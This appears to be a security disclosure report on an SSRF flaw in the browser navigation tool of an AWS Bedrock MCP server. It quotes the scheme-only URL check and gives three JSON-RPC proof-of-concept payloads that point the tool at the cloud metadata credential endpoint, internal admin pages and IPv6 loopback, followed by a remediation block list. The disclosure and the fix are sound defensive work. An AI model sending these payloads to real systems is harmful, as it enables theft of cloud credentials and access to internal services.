# Vulnerability Report: SSRF with No Hostname Validation (AWS Bedrock MCP)

## Summary

| Field | Value |
|---|---|
| **Repository** | [awslabs/mcp](https://github.com/awslabs/mcp) (9,433 stars) |
| **Vulnerability Type** | SSRF — Incomplete URL Validation (CWE-918, CWE-20) |
| **CVSS v3.1 Score** | **6.5 (Medium)** — `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` |
| **Affected File** | `src/amazon-bedrock-agentcore-mcp-server/.../browser/navigation.py` |
| **Suggested Submission** | HackerOne — AWS |

---

## Vulnerability Details

### Root Cause

URL validation only checks scheme (protocol), not hostname:

```python
# navigation.py
ALLOWED_SCHEMES = {"http", "https"}

def _validate_url_scheme(url: str) -> bool:
    try:
        parsed = urlparse(url)
        return parsed.scheme in ALLOWED_SCHEMES
    except Exception:
        return False

async def browser_navigate(url: str, **kwargs):
    if not _validate_url_scheme(url):
        return {"error": "URL scheme not allowed"}
    # These ALL pass validation:
    # - http://169.254.169.254/latest/meta-data/  ✅
    # - http://10.0.0.1/admin                      ✅
    # - http://127.0.0.1:8080/internal-api         ✅
    await page.goto(url)
```

Missing: private IP detection, link-local detection, loopback detection, cloud metadata blocking, DNS resolution check.

---

## Proof of Concept

### PoC 1: AWS IAM Credential Theft
```json
{
    "jsonrpc": "2.0", "id": 1, "method": "tools/call",
    "params": {"name": "browser_navigate", "arguments": {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}}
}
```
**Result on EC2:** Returns IAM role name. Follow-up with role name returns full temporary credentials (AccessKeyId, SecretAccessKey, Token).

### PoC 2: Internal Service Access
```json
{
    "jsonrpc": "2.0", "id": 2, "method": "tools/call",
    "params": {"name": "browser_navigate", "arguments": {"url": "http://10.0.0.50:8080/internal-admin"}}
}
```

### PoC 3: IPv6 Loopback Bypass
```json
{
    "jsonrpc": "2.0", "id": 3, "method": "tools/call",
    "params": {"name": "browser_navigate", "arguments": {"url": "http://[::1]:8080/admin"}}
}
```
Bypasses IPv4-only filters.

---

## Remediation
```python
import ipaddress

BLOCKED_NETWORKS = [
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('169.254.0.0/16'),
    ipaddress.ip_network('::1/128'),
    ipaddress.ip_network('fc00::/7'),
]
METADATA_HOSTS = {'169.254.169.254', 'metadata.google.internal', '168.63.129.16'}

def validate_url_full(url: str) -> tuple[bool, str]:
    parsed = urlparse(url)
    if parsed.scheme not in {'http', 'https'}:
        return False, f"Scheme {parsed.scheme} not allowed"
    hostname = parsed.hostname
    if hostname in METADATA_HOSTS:
        return False, "Cloud metadata endpoints blocked"
    try:
        ip = ipaddress.ip_address(hostname)
        for net in BLOCKED_NETWORKS:
            if ip in net:
                return False, f"Blocked (private/reserved: {hostname})"
    except ValueError:
        resolved = socket.getaddrinfo(hostname, None)
        for *_, sockaddr in resolved:
            ip = ipaddress.ip_address(sockaddr[0])
            for net in BLOCKED_NETWORKS:
                if ip in net:
                    return False, f"DNS resolved {hostname} to blocked IP {ip}"
    return True, ""
```

## References
- [CWE-918: SSRF](https://cwe.mitre.org/data/definitions/918.html)
- [AWS IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
